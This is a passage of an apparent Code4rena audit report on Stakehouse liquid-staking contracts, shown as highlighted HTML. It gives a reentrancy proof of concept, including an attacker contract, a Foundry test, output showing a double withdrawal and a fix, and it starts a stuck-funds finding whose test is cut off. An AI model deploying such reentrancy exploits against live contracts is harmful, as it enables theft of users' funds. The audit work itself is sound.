class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdrawETHForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">state</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">state</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;publicKeys1&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>There is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling <code>withdrawETHForKnot</code>.</p>\n<p>We add the test case.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testBypassIsContractCheck_POC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">NonEOARepresentative</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pass</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NonEOARepresentative</span><span class=\"mtk1\">{</span><span class=\"mtk12\">value</span><span class=\"mtk1\">: </span><span class=\"mtk7\">8</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pass</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reprenstative</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletRepresentative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;smart contract registered as a EOA representative&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reprenstative</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pass</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">MockAccountManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">accountMan</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">setLifecycleStatus</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;publicKeys1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">pass</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;publicKeys1&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;balance after the withdraw, expected 4 ETH, but has 8 ETH&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pass</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We run the test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">forge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> -</span><span class=\"mtk12\">vv</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">match</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testWithdraw_Reentrancy_POC</span></span></span></code></pre>\n<p>And the result is</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Running</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">foundry</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">LiquidStakingManagerTests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span><span class=\"mtk12\">PASS</span><span class=\"mtk1\">] </span><span class=\"mtk11\">testWithdraw_Reentrancy_POC</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">578021</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Logs:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  smart contract registered as a EOA representative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  balance after the withdraw, expected 4 ETH, but has 8 ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  8000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Test result: ok. 1 passed; 0 failed; finished in 14.85ms</span></span></span></code></pre>\n<p>The function call is</p>\n<p><code>pass.withdraw(\"publicKeys1\")</code>, which calls</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">IManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdrawETHForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Which trigger:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// refund 4 ether from smart wallet to node runner&#39;s EOA</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">IOwnableSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">rawExecute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Which triggers reentrancy to withdraw the fund again before the public key is banned.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">state</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">state</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;publicKeys1&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// update the mapping</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bannedBLSPublicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// refund 4 ether from smart wallet to node runner&#39;s EOA</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">IOwnableSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">rawExecute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-06-bringunusedethbackintogiantpool-can-cause-stuck-ether-funds-in-giant-pool\" style=\"position:relative;\"><a href=\"#h-06-bringunusedethbackintogiantpool-can-cause-stuck-ether-funds-in-giant-pool\" aria-label=\"h 06 bringunusedethbackintogiantpool can cause stuck ether funds in giant pool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115\">[H-06] <code>BringUnusedETHBackIntoGiantPool</code> can cause stuck ether funds in Giant Pool</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115\">koxuan</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/194\">hihen</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137-L158\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137-L158</a><br></p>\n<p><code>withdrawUnusedETHToGiantPool</code> will withdraw any eth from the vault if staking has not commenced(knot status is <code>INITIALS_REGISTERED</code>), the eth will be drawn successful to the giant pool. However, idleETH variable is not updated. idleETH  is the available ETH for withdrawing and depositing eth for staking. Since there is no other places that updates idleETH other than depositing eth for staking and withdrawing eth, the eth withdrawn from the vault will be stuck forever.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Place poc in GiantPools.t.sol with <code>import { MockStakingFundsVault } from \"../../contracts/testing/liquid-staking/MockStakingFundsVault.sol\";</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testStuckFundsInGiantMEV</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">MockStakingFundsVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakingFundsVault</span><span class=\"mtk1\">()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">victim</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountFour</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">registerSingleBLSPubKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">accountFour</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">giantFeesAndMevPool</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">giantFeesAndMevPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositETH</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsKeysForVaults</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[][](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">blsKeysForVaults</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeAmountsForVaults</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[][](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stakeAmountsForVaults</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">getUint256ArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">giantFeesAndMevPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">batchDepositETHForStaking</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getAddressArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">)),</span><span class=\"mtk11\">getUint256ArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">) , </span><span class=\"mtk12\">blsKeysForVaults</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmountsForVaults</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span 